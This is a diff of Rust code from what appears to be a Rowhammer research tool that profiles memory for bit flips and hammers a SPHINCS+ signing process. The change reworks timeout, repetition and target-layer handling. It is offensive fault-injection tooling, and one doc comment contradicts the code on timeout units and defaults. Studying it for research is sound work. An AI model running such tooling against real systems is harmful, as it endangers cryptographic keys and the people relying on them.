@@ -77,14 +77,14 @@ struct CliArgs {
     /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
     /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
     /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
-    #[arg(long, conflicts_with = "timeout")]
-    repeat: Option<Option<usize>>,
-    /// The timeout in seconds for the hammering process. The default is `None`, causing the hammering process to run indefinitely.
-    #[arg(long, conflicts_with = "repeat")]
-    timeout: Option<u64>,
+    #[arg(long)]
+    repeat: Option<usize>,
+    /// The timeout in seconds for the hammering process. The default is 10, meaning that the hammering process will exit after 10 minutes.
+    #[arg(long)]
+    timeout: u64,
     /// The number of rounds to profile for vulnerable addresses.
     /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
-    #[arg(long, default_value = "1")]
+    #[arg(long, default_value = "10")]
     profiling_rounds: u64,
     /// The reproducibility threshold for a bit flip to be considered reproducible.
     /// The threshold is a fraction of the number of profiling rounds. If a bit flip is detected in at least `threshold` rounds, it is considered reproducible.
@@ -237,8 +237,6 @@ struct RoundProfile {
 
 type Profiling = Vec<RoundProfile>;
 
-const NUM_HAMMER_ROUNDS: u32 = 50;
-
 /// Hammer a given `memory` region `num_rounds` times to profile for vulnerable addresses.
 fn hammer_profile(
     hammerer: &Hammerer,
@@ -323,6 +321,10 @@ impl<T, E> ExperimentData<T, E> {
     }
 }
 
+fn check_timeout(timeout: Duration, start: std::time::Instant) -> bool {
+    std::time::Instant::now() - start > timeout
+}
+
 unsafe fn _main() -> anyhow::Result<()> {
     let progress = init_logging_with_progress()?;
 
@@ -340,14 +342,12 @@ unsafe fn _main() -> anyhow::Result<()> {
             .create_allocator(mem_config, config.threshold, Some(progress.clone()));
     let block_size = alloc_strategy.block_size();
 
-    let repetitions = match (args.timeout, args.repeat) {
-        (None, Some(Some(repeat))) => repeat,
-        (None, Some(None)) | (Some(_), None) => usize::MAX,
-        (None, None) => 1,
-        (Some(_), Some(_)) => bail!("Cannot specify both --timeout and --repeat"),
+    let repetitions = match args.repeat {
+        Some(repeat) => repeat,
+        None => usize::MAX,
     };
 
-    let timeout = args.timeout.map(|t| Duration::from_secs(t * 60));
+    let timeout = Duration::from_secs(args.timeout * 60);
 
     let start = std::time::Instant::now();
 
@@ -359,18 +359,17 @@ unsafe fn _main() -> anyhow::Result<()> {
     }
     let mut stats = vec![];
 
+    let target_layer = 0;
     let mut experiments: Vec<ExperimentData<HammerResult, ExperimentError>> = vec![];
     'repeat: for _ in 0..repetitions {
-        if let Some(timeout) = timeout {
-            if std::time::Instant::now() - start > timeout {
-                break;
-            }
+        if check_timeout(timeout, start) {
+            info!("Timeout reached. Stopping.");
+            break;
         }
         info!("Starting bait allocation");
-        let start = std::time::Instant::now();
         let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
         let target_pfn = memory
-            .addr(PAGE_SIZE + TARGET_OFFSETS_SHAKE_256S[0].page_offset)
+            .addr(PAGE_SIZE + TARGET_OFFSETS_SHAKE_256S[target_layer].page_offset)
             .pfn()?;
         let alloc_duration = std::time::Instant::now() - start;
         info!("Allocated {} bytes of memory", memory.len());
@@ -392,7 +391,9 @@ unsafe fn _main() -> anyhow::Result<()> {
             args.attempts,
             true,
             target_pfn,
-            TARGET_OFFSETS_SHAKE_256S[0].flip_direction.clone(),
+            TARGET_OFFSETS_SHAKE_256S[target_layer]
+                .flip_direction
+                .clone(),
         )?;
         let profiling = hammer_profile(
             &profile_hammer,
@@ -449,18 +450,17 @@ unsafe fn _main() -> anyhow::Result<()> {
             }
         };
 
-        let dpattern = profiling
-            .clone()
+        let target_profile = profiling
             .iter()
             .find(|prof| {
                 prof.bit_flips
                     .iter()
                     .any(|b| b.addr == victim.target_addr() as usize)
             })
-            .map(|prof| prof.pattern.clone())
             .expect("no round with flips in addr");
+        let dpattern = target_profile.pattern.clone();
 
-        memory.initialize(dpattern);
+        memory.initialize(dpattern.clone());
         match victim.start() {
             Ok(_) => {}
             Err(e) => {
@@ -485,10 +485,16 @@ unsafe fn _main() -> anyhow::Result<()> {
             args.attempts,
             false, // this MUST be false for SphincsPlus victim (due to SIGSTOP handlers)
             target_pfn,
-            TARGET_OFFSETS_SHAKE_256S[0].flip_direction.clone(),
+            TARGET_OFFSETS_SHAKE_256S[target_layer]
+                .flip_direction
+                .clone(),
         )?;
         let mut results = vec![];
-        for _ in 0..NUM_HAMMER_ROUNDS {
+        loop {
+            if check_timeout(timeout, start) {
+                info!("Timeout reached. Stopping.");
+                break;
+            }
             let result = hammer.hammer(&mut victim);
             match result {
                 Ok(result) => {
